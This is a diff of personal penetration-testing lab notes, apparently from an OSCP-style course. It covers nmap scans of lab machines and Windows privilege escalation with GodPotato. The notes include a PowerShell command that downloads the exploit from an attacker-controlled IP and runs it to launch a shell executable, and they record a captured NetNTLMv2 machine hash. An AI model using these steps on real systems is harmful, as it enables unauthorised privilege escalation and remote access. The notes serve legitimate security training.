@@ -1,10 +1,26 @@
 # VM 3
-- 192.168.214.120
+- ?
+- ```
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
+    |   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
+    |_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
+    80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
+    |_http-title: PAW! (PWK Awesome Website)
+    |_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+  ```
 ## Foothold
 
 
 # VM 4
-- 192.168.214.121 Windows
+- Web02
+- Microsoft Windows Server 2022 Standard
+- 10.0.20348 N/A Build 20348
+
 ## FootHold
 - Ez SQLi
     ``` 
@@ -15,16 +31,26 @@
 ## Root 
 - SeImpersonate Permission Found & NET4.0 -> GodPotato
   ```
-    iwr -uri http://192.168.45.219/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+    iwr -uri http://192.168.45.155/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
     .\GodPotato-NET4.exe -cmd 'whoami'
     .\GodPotato-NET4.exe -cmd 'C:\Windows\temp\shell.exe'
    ```
 - Interesting Info
-    1. ```  Version: NetNTLMv2
-  Hash:    WEB02$::MEDTECH:1122334455667788:757d0de376d8456d510a56bbc91d2ab2:0101000000000000229fe7efdce0da013a25e15c16fb223a000000000800300030000000000000000000000000300000d8c929a18f8306528b604ac0f3f091c5301c8c3d9d4689b5c867902e15f0f4230a00100000000000000000000000000000000000090000000000000000000000 ```
+    1. ``` 
+            Version: NetNTLMv2
+            Hash:    WEB02$::MEDTECH:1122334455667788:757d0de376d8456d510a56bbc91d2ab2:0101000000000000229fe7efdce0da013a25e15c16fb223a000000000800300030000000000000000000000000300000d8c929a18f8306528b604ac0f3f091c5301c8c3d9d4689b5c867902e15f0f4230a00100000000000000000000000000000000000090000000000000000000000
+      ```
     2. 
 
 
 # VM 5
-- 192.168.214.122
-
+- ?
+- ```
+    PORT     STATE SERVICE  VERSION
+    22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
+    |_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
+    1194/tcp open  openvpn?
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  ```
